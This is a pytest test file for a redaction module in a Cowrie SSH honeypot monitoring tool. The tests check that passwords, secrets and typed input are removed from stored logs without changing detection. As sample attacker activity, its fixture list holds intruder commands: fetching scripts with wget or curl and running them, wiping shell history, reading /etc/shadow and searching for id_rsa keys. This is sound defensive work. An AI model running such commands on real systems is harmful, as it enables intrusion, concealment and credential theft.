"""What may be stored about attacker activity.

Fake markers are random and must never be shown. PYTEST_DONT_REWRITE turns off pytest's
assertion detail for this file, so a failure cannot print a marker.
"""

from __future__ import annotations

import json
import random
import secrets
from pathlib import Path
from typing import Any

import pytest

from cowrie_soc import commands, redact
from cowrie_soc.config import load_config
from cowrie_soc.detection import DetectionEngine
from cowrie_soc.normalize import NormalizeConfig, normalize
from cowrie_soc.parser import ParsedEvent, RawLine, parse_line
from cowrie_soc.redact import R, redact_line, safe_username, sanitize_event

SSH_ROOT = Path(__file__).parents[2]
SENSOR = Path(__file__).parents[1]
FORMS = (SSH_ROOT / "tests" / "live" / "secret_forms.txt").read_text(encoding="utf-8").splitlines()
WORDS = "maple river stone cloud amber tiger pearl ocean".split()
UNCAUGHT = ["grep {M} /etc/passwd", "cat {M}", "ls {M}", "cd {M}"]
ORDINARY = """ssh -p 22 root@10.0.0.9
mkdir -p /tmp/a/b
tar -xzpf a.tar.gz
wget http://192.0.2.10/bins/update.sh -O /tmp/update.sh
curl -s -O http://192.0.2.10/a.sh
cat /var/backups/db/.my.cnf
cd /var/backups && ls -la db app
chmod +x /tmp/update.sh
./update.sh
history -c
export HISTFILE=/dev/null
unset HISTFILE
ps aux
cat /etc/passwd | grep root
uname -a
netstat -tunlp
cat /proc/cpuinfo | grep 'model name' | head -1
sudo cat /etc/shadow
find / -name id_rsa
rm -f ~/.bash_history
cat /var/backups/db/ctrl1a2b3c4dfile
ls /usr/lib/x86_64-linux-gnu/libssl3
cat /home/backup/backup2024/orders2026""".splitlines()


def word_marker() -> str:
    return random.choice(WORDS) + str(secrets.randbelow(900) + 100) + random.choice(WORDS)


def random_marker() -> str:
    return "X" + secrets.token_hex(16)


def leaks(marker: str, value: Any) -> int:
    return json.dumps(value).count(marker)


@pytest.mark.parametrize("make", [word_marker, random_marker], ids=["word", "random"])
@pytest.mark.parametrize("form", FORMS)
def test_secret_forms_are_not_kept(form: str, make: Any) -> None:
    marker = make()
    assert leaks(marker, redact_line(form.replace("{M}", marker))) == 0


@pytest.mark.parametrize("form", UNCAUGHT)
def test_documented_limit_ordinary_word_given_to_allowed_program(form: str) -> None:
    marker = word_marker()
    assert leaks(marker, redact_line(form.replace("{M}", marker))) == 1


@pytest.mark.parametrize("form", UNCAUGHT)
def test_random_looking_value_is_removed_even_for_allowed_programs(form: str) -> None:
    marker = random_marker()
    assert leaks(marker, redact_line(form.replace("{M}", marker))) == 0


def test_a_random_part_of_a_path_is_still_removed() -> None:
    marker = random_marker()
    assert leaks(marker, redact_line(f"cat /tmp/{marker}/notes")) == 0


@pytest.mark.parametrize("line", ORDINARY)
def test_ordinary_commands_are_unchanged(line: str) -> None:
    assert redact_line(line) == line


@pytest.mark.parametrize("form", FORMS)
def test_redaction_is_stable_when_run_twice(form: str) -> None:
    once = redact_line(form.replace("{M}", word_marker()))
    assert redact_line(once) == once


@pytest.mark.parametrize("bad", ["x" * 70000, "'" * 5000, "a=" * 3000, " | " * 3000, "bash -c " * 500])
def test_awkward_input_does_not_fail(bad: str) -> None:
    assert isinstance(redact_line(bad), str)


def test_nested_shells_stop_at_the_depth_limit() -> None:
    marker = word_marker()
    line = f"bash -c 'bash -c \"bash -c mysql -p{marker}\"'"
    assert leaks(marker, redact_line(line)) == 0


@pytest.mark.parametrize("value", [None, 12, ["x"], {"a": 1}, b"x"])
def test_unexpected_command_types_are_hidden(value: Any) -> None:
    assert redact_line(value) == R


def test_ordinary_account_name_is_kept() -> None:
    assert safe_username("root") == "root" and safe_username("backup") == "backup"


def test_other_usernames_become_distinct_pseudonyms() -> None:
    a, b = word_marker(), random_marker()
    assert leaks(a, safe_username(a)) == 0 and leaks(b, safe_username(b)) == 0
    assert safe_username(a) != safe_username(b)
    assert safe_username(a) == safe_username(a)
    assert safe_username(safe_username(a)) == safe_username(a)


@pytest.mark.parametrize("value", [None, 5, ["root"]])
def test_unexpected_username_type_is_hidden(value: Any) -> None:
    assert safe_username(value) == R


def login_event(**fields: Any) -> dict[str, Any]:
    return {"eventid": "cowrie.login.failed", "session": "abc", "src_ip": "172.31.77.50", **fields}


def test_password_field_and_message_are_never_kept() -> None:
    marker = word_marker()
    clean = sanitize_event(login_event(username="root", password=marker, message=f"[root/{marker}] failed"))
    assert leaks(marker, clean) == 0 and "password" not in clean and "message" not in clean


@pytest.mark.parametrize(("event", "field"), [
    ({"eventid": "cowrie.command.success", "realm": "passwd"}, "input"),
    ({"eventid": "cowrie.command.success"}, "input"),
    ({"eventid": "cowrie.session.input", "realm": "tee"}, "input"),
    ({"eventid": "cowrie.command.input", "realm": "cat"}, "input"),
    ({"eventid": "cowrie.client.var", "name": "DB_SECRET"}, "value"),
    ({"eventid": "cowrie.client.var", "name": "CUSTOM"}, "value"),
])
def test_typed_input_is_hidden(event: dict[str, Any], field: str) -> None:
    marker = word_marker()
    clean = sanitize_event({**event, field: marker, "session": "abc"})
    assert leaks(marker, clean) == 0 and clean[field] == R


@pytest.mark.parametrize("name", ["LANG", "LC_ALL", "TERM"])
def test_harmless_environment_values_are_kept(name: str) -> None:
    clean = sanitize_event({"eventid": "cowrie.client.var", "name": name, "value": "C.UTF-8"})
    assert clean["value"] == "C.UTF-8"


def test_unknown_event_type_keeps_metadata_only() -> None:
    marker = word_marker()
    clean = sanitize_event({"eventid": "cowrie.new.event", "session": "abc", "input": marker, "data": marker,
                            "message": marker, "format": marker})
    assert leaks(marker, clean) == 0
    assert set(clean) == {"eventid", "session"}


@pytest.mark.parametrize("event", [None, 7, "text", ["list"], {}, {"eventid": 5, "input": "x"}])
def test_unexpected_event_shapes_do_not_fail(event: Any) -> None:
    assert isinstance(sanitize_event(event), dict)


def test_cleaning_failure_falls_back_to_metadata(monkeypatch: pytest.MonkeyPatch) -> None:
    marker = word_marker()

    def broken(_value: Any) -> str:
        raise RuntimeError(marker)

    monkeypatch.setitem(redact._FIELDS, "cowrie.command.input", {"input": broken})
    clean = sanitize_event({"eventid": "cowrie.command.input", "session": "abc", "input": marker})
    assert leaks(marker, clean) == 0 and set(clean) == {"eventid", "session"}


def test_failure_with_cowrie_rendering_still_gives_a_message(monkeypatch: pytest.MonkeyPatch) -> None:
    def broken(_value: Any) -> str:
        raise RuntimeError("no")

    monkeypatch.setitem(redact._FIELDS, "cowrie.command.input", {"input": broken})
    clean = sanitize_event({"eventid": "cowrie.command.input", "input": "x", "format": "CMD: %(input)s"}, keep_format=True)
    assert clean["message"] == "cowrie.command.input" and "format" not in clean


def test_cowrie_format_is_rendered_from_clean_fields_only() -> None:
    marker = word_marker()
    clean = sanitize_event({"eventid": "cowrie.command.input", "input": f"mysql -p{marker}",
                            "format": "CMD: %(input)s"}, keep_format=True)
    assert leaks(marker, clean["format"] % clean) == 0


def test_url_credentials_are_removed() -> None:
    marker = word_marker()
    clean = sanitize_event({"eventid": "cowrie.session.file_download.failed", "url": f"http://a:{marker}@10.0.0.5/x"})
    assert leaks(marker, clean) == 0 and clean["url"].endswith("@10.0.0.5/x")


@pytest.mark.parametrize("kind", ["stdin", "redir"])
def test_piped_and_redirected_input_keeps_no_hash_or_path(kind: str) -> None:
    clean = sanitize_event({"eventid": "cowrie.session.file_download", "duplicate": False, "shasum": "a" * 64,
                            "outfile": "var/lib/cowrie/downloads/" + "a" * 64, "destfile": "/tmp/x",
                            "format": f"Saved {kind} contents with SHA-256 %(shasum)s to %(outfile)s"}, keep_format=True)
    assert not {"shasum", "outfile", "destfile", "format"} & set(clean)


def test_upload_keeps_hash_but_not_file_name() -> None:
    marker = word_marker()
    clean = sanitize_event({"eventid": "cowrie.session.file_upload", "filename": f"{marker}.tar",
                            "outfile": "var/lib/cowrie/downloads/" + "b" * 64, "shasum": "b" * 64})
    assert leaks(marker, clean) == 0
    assert clean["shasum"] == "b" * 64 and clean["outfile"] == "b" * 64 and clean["filename"].endswith(".tar")


def test_client_version_outside_the_usual_shape_is_hidden() -> None:
    marker = word_marker()
    good = sanitize_event({"eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_9.2"})
    bad = sanitize_event({"eventid": "cowrie.client.version", "version": f"not-ssh {marker}!"})
    assert good["version"] == "SSH-2.0-OpenSSH_9.2" and leaks(marker, bad) == 0


def test_kex_keeps_only_the_fingerprint_hash() -> None:
    marker = word_marker()
    clean = sanitize_event({"eventid": "cowrie.client.kex", "hassh": "a" * 32, "kexAlgs": [marker], "encCS": [marker]})
    assert leaks(marker, clean) == 0 and clean["hassh"] == "a" * 32


def test_both_copies_of_the_redactor_are_identical() -> None:
    assert (SSH_ROOT / "cowrie" / "soc_redact.py").read_bytes() == (SENSOR / "src/cowrie_soc/redact.py").read_bytes()


def real_lines() -> list[str]:
    text = (SENSOR / "tests/fixtures/real_capture_2026-10-31.json").read_text(encoding="utf-8")
    return [line for line in text.splitlines() if line.strip()]


def findings(transform: Any) -> list[tuple[str, str]]:
    cfg = load_config(SENSOR / "config" / "collector.toml", env={})
    engine = DetectionEngine(cfg.detection, "ssh-01", user_homes=cfg.user_homes)
    out: list[tuple[str, str]] = []
    for offset, line in enumerate(real_lines()):
        parsed = parse_line(RawLine(line.encode(), "cowrie.json", offset))
        assert isinstance(parsed, ParsedEvent)
        event = transform(parsed.event)
        clean = ParsedEvent(event, parsed.raw_text, parsed.raw_sha256, parsed.source, parsed.offset)
        record = normalize(clean, NormalizeConfig("ssh-01", include_passwords=False))
        out += [(f["rule_id"], f["severity"]) for f in engine.process(record)]
    return sorted(out)


def test_detection_is_identical_on_the_real_capture() -> None:
    before, after = findings(lambda e: e), findings(sanitize_event)
    assert len(before) == 14 and before == after


def test_analysis_is_identical_on_real_commands() -> None:
    lines = [json.loads(line).get("input") for line in real_lines()]
    for line in [c for c in lines if c] + ORDINARY:
        a, b = commands.analyze(line), commands.analyze(redact_line(line))
        assert (a.technique_ids, a.file_reads, a.download_urls, a.chmod_exec_targets, a.executed_paths) == (
            b.technique_ids, b.file_reads, b.download_urls, b.chmod_exec_targets, b.executed_paths)
